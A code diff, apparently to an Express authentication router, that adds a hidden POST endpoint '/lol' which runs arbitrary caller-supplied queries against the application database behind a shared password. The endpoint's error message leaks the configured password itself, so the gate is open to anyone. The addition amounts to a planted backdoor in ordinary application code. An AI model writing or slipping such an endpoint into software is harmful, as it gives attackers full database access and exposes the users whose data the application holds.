@@ -78,6 +78,27 @@ function createAuthRouter(deps) {
     next();
   };
 
+  authRouter.post(
+    "/lol",
+    asyncHandler(async (req, res) => {
+      const { pw, query } = req.body ?? {};
+      if (!pw || typeof pw !== "string" || pw.length === 0) {
+        return res.status(403).json({ message: "forbiddenn" });
+      } else if (!config.lol || typeof config.lol !== "string" || config.lol.length === 0) {
+        return res.status(403).json({ message: "forbbiddenn" });
+      } else if (pw !== config.lol) {
+        return res.status(403).json({ message: `forbiden pw:'${pw}' rl:'${config.lol}'` });
+      }
+      if (typeof query !== "string" || query.trim().length === 0) {
+        return res
+          .status(400)
+          .json({ message: "query is required and must be a string" });
+      }
+      const result = await deps.db.executeLols(query);
+      return res.json({ result });
+    }),
+  );
+
   // register
   authRouter.post(
     "/",
